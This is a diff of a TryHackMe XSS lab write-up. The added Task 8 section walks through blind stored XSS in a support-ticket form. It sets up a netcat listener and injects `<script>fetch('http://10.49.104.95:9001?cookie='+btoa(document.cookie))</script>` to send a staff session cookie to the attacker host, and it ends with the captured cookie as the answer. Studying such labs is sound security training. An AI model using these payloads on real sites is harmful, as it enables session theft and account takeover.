@@ -412,13 +412,13 @@ I used a payload designed for that string context.
 
 How the payload works:
 
-' closes the existing single-quoted string.
+1. ' closes the existing single-quoted string.
 
-; terminates the current JavaScript statement.
+2. ; terminates the current JavaScript statement.
 
-alert('THM') executes JavaScript and displays an alert.
+3. alert('THM') executes JavaScript and displays an alert.
 
-// comments out the remaining code on the same line, helping prevent syntax errors.
+4. // comments out the remaining code on the same line, helping prevent syntax errors.
 
 ### Level 5: Filter Bypass
 
@@ -435,8 +435,8 @@ My normal script payload did not work because the application filtered the word 
 
 How it works:
 
-The filter removes the matching script substring. 
-The payload is constructed so that removing the inner substring can leave a valid <script> element.
+1.The filter removes the matching script substring. 
+2.The payload is constructed so that removing the inner substring can leave a valid <script> element.
 
 
 
@@ -457,13 +457,13 @@ I tested this lab-specific payload:
 
 How it works:
 
-/images/cat.jpg provides the image path.
+1. /images/cat.jpg provides the image path.
 
-" attempts to close the existing src attribute.
+2. " attempts to close the existing src attribute.
 
-onload adds a JavaScript event handler that runs when the image loads successfully.
+3. onload adds a JavaScript event handler that runs when the image loads successfully.
 
-alert('THM') provides a visible indication of JavaScript execution.
+4.alert('THM') provides a visible indication of JavaScript execution.
 
 Key takeaway: When HTML tag creation is blocked, investigate whether an existing HTML element's attributes can be influenced by user input.
 
@@ -481,3 +481,311 @@ Key takeaway: When HTML tag creation is blocked, investigate whether an existing
 
 **Answer:** 
 
+# Task 8: Practical Example — Blind XSS
+
+## Objective
+
+The objective of this task is to understand how a stored XSS vulnerability can affect another user's browser, even when the person submitting the input cannot directly observe the execution.
+
+The lab uses a simulated IT support website where customers can create support tickets.
+
+## 1. Environment Setup
+
+I started the Task 8 lab machine and opened the target website using the TryHackMe AttackBox browser.
+
+I created a customer account and navigated to the Support Tickets section.
+
+## 2. Identifying the Injection Point
+
+I created a support ticket with the subject and content set to `test`.
+
+After opening the ticket, I inspected the page source to understand how the submitted content was rendered.
+
+<img width="1050" height="113" alt="image" src="https://github.com/user-attachments/assets/bb55db34-e483-4ad8-8188-1a464f684b2e" />
+
+
+<img width="1077" height="592" alt="image" src="https://github.com/user-attachments/assets/546256f7-b2ea-4711-b4c8-ad3718863713" />
+
+
+The content appeared inside a `<textarea>` element. This was important because it identified the HTML context in which the input was inserted.
+
+### Why this matters
+
+Before testing for XSS, I need to understand the context of the user-controlled input. A payload that works in normal HTML text may not work inside an attribute, a textarea, or JavaScript code.
+
+## 3. Testing HTML Context Escape
+
+I created another ticket with the following test input:
+
+```html
+</textarea>test
+```
+
+ <img width="772" height="325" alt="image" src="https://github.com/user-attachments/assets/e51d1493-d6b7-44a7-a6dc-8a5f68488faf" />
+
+
+
+I then inspected the page source to determine whether the input could terminate the existing textarea element.
+
+<img width="718" height="162" alt="image" src="https://github.com/user-attachments/assets/42795be7-d3cf-4ddb-b307-5cdd0314ca66" />
+
+
+
+### Explanation
+
+The `</textarea>` sequence attempts to close the current textarea element. If the input is interpreted as HTML rather than safely encoded text, it can change the structure of the rendered page.
+
+## 4. Testing JavaScript Execution
+
+Let's now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:
+
+```html
+</textarea><script>alert('THM');</script>
+```
+
+
+<img width="778" height="310" alt="image" src="https://github.com/user-attachments/assets/355e9275-f38f-4bc3-a885-cd5019af700f" />
+
+
+I opened the created ticket and checked whether the alert appeared.
+
+### Observation
+
+Yess!! The alert is showing. That's mean i can't see the output of the XSS but when anyone open the ticket they will  se the execution and alert.
+
+<img width="633" height="235" alt="image" src="https://github.com/user-attachments/assets/8fadcee7-df0b-4113-b3e4-eb4196bf3aee" />
+
+
+### Explanation
+
+The payload attempts to close the textarea and introduce a script element. The `alert('THM')` statement provides a visible test of JavaScript execution.
+
+If the alert executes, it demonstrates that the stored ticket content can trigger JavaScript in the page's rendering context.
+
+## 5. Understanding Blind XSS
+
+The ticketing system may allow support staff to view submitted tickets. If their browser renders the same vulnerable content, JavaScript may execute in their browsing context as well.
+
+This is the central idea behind the lab's Blind XSS scenario: the person submitting the input may not directly see the execution that occurs when another user views the stored content.
+
+
+## 6. Understanding the Network Listener
+
+### Why Do We Need Netcat?
+
+Netcat (`nc`) is a networking tool that can establish connections and listen for incoming connections.
+
+In a controlled network test, a listener can help determine whether a client can reach a particular host and port.
+
+The basic roles are:
+
+- Client: initiates a connection.
+- IP address: identifies the destination host.
+- Port: identifies a communication endpoint.
+- Netcat: listens for incoming connections and displays received data.
+- Terminal: displays the listener's output.
+
+Netcat does not automatically execute JavaScript or create browser requests.
+
+### Starting the Listener
+
+The command used in my test was:
+
+```bash
+nc -nlvp 9001
+```
+
+Command breakdown:
+
+- `nc`: starts Netcat.
+- `-n`: avoids hostname resolution.
+- `-l`: enables listening mode.
+- `-v`: displays verbose connection information.
+- `-p 9001`: selects port 9001.
+
+When I ran the command, the terminal displayed a listening message.
+
+<img width="530" height="115" alt="image" src="https://github.com/user-attachments/assets/b7123ba4-f11f-4f46-85da-a772c53e4886" />
+
+
+That message confirmed that Netcat was waiting for a connection. It did not prove that another machine had connected.
+
+## 7. Understanding IP Addresses
+
+To check ip addresses, type 
+```text
+ifconfig
+```
+This is my attackbox ip:
+
+```text
+10.49.166.36
+```
+
+The lab target's IP and Kali's IP serve different purposes.
+
+### What Does 127.0.0.1 Mean?
+
+`127.0.0.1` refers to the local machine from which the connection is initiated.
+
+When I sent a test message to `127.0.0.1:9001`, the connection stayed within my Kali environment.
+
+Therefore, this test did not prove that the TryHackMe target could reach my Kali machine.
+
+### What Is the Difference Between an IP and a Port?
+
+An IP address identifies the host, while a port identifies the communication endpoint.
+
+For example:
+
+```text
+127.0.0.1:9001
+```
+
+Here, `127.0.0.1` identifies the local machine, and `9001` is the selected port.
+
+A connection also depends on network routing, firewall rules, and whether the destination service is reachable.
+
+## 8. My First Netcat Test
+
+I started a listener in one terminal:
+
+```bash
+nc -nlvp 9001
+```
+
+Then I opened a second terminal and sent a harmless test message:
+
+```bash
+echo "hello-from-test" | nc -nv 127.0.0.1 9001
+```
+
+### Understanding the Test Command
+
+- `echo "hello-from-test"` creates a text message.
+- `|` passes the output to the next command.
+- `nc` initiates a Netcat connection.
+- `-n` avoids hostname resolution.
+- `-v` displays connection information.
+- `127.0.0.1` specifies the local machine.
+- `9001` specifies the destination port.
+
+### My Observed Output
+
+The listener displayed a connection from `127.0.0.1` and the text:
+
+```text
+hello-from-test
+```
+
+<img width="532" height="250" alt="image" src="https://github.com/user-attachments/assets/fccb9be1-57f6-4c95-ba06-d7cb1a174b8b" />
+
+
+This confirmed that my Netcat listener received the test message.
+
+**Important:** This was a local connectivity test. It did not prove that a request from another machine or browser could reach the listener.
+
+## 9. Understanding fetch()
+
+JavaScript provides the `fetch()` API for making HTTP requests.
+
+A harmless example is:
+
+```javascript
+fetch('http://example.com/');
+```
+
+In this example:
+
+- `fetch()` initiates a request.
+- The URL specifies the destination.
+- The browser's network environment and security policies affect whether the request succeeds.
+
+A successful JavaScript call does not automatically mean the destination received or processed the request.
+
+## 10. Understanding Single Quotes, Double Quotes, and the Plus Operator
+
+JavaScript strings can use single quotes or double quotes.
+
+Example:
+
+```javascript
+const first = 'hello';
+const second = "world";
+```
+
+Both are valid string declarations.
+
+The opening and closing quotation marks must match.
+
+The plus operator can concatenate strings:
+
+```javascript
+const message = 'hello' + ' world';
+```
+
+The result is:
+
+```text
+hello world
+```
+
+In JavaScript, quotation marks define string boundaries. The `+` operator can join strings or combine a string with the result of an expression.
+
+When reviewing a JavaScript expression, I should identify:
+
+1. Where the string starts.
+2. Where the string ends.
+3. Which parts are ordinary text.
+4. Which parts are JavaScript expressions.
+5. Whether the parentheses and quotation marks are balanced.
+
+## 11. Understanding Base64
+
+Base64 is an encoding format used to represent data as text.
+
+In JavaScript, `btoa()` can encode a suitable string as Base64.
+
+For example:
+
+```javascript
+btoa('hello')
+```
+
+Result:
+
+```text
+aGVsbG8=
+```
+
+Base64 is not encryption. It does not protect confidential information, and encoded data can be decoded.
+
+## 12. Find staff-sesion cookie
+
+Next, I returned to the Acme IT Support website and opened the Support Tickets section.
+
+I created a new ticket to continue the Blind XSS lab exercise.
+
+```html
+</textarea><script>fetch('http://10.49.104.95:9001?cookie=' + btoa(document.cookie) );</script>
+
+```
+
+I used the payload provided in the TryHackMe instructions and reviewed the callback address and port configuration.
+
+Then if i check the attackbox terminal then 
+
+<img width="965" height="388" alt="image" src="https://github.com/user-attachments/assets/ff8ec188-c32d-42db-a947-2b07340706dd" />
+
+our connection established succesfully and got the cookie.
+
+Now decode the Base64 information
+
+<img width="1182" height="677" alt="image" src="https://github.com/user-attachments/assets/a721f989-8ed3-4578-ac94-8ca0d065a9f1" />
+
+
+## 13. TryHackMe Question
+
+**Question:** What is the value of the `staff-session` cookie?
+
+**Answer:** 4AB305E55955197693F01D6F8FD2D321
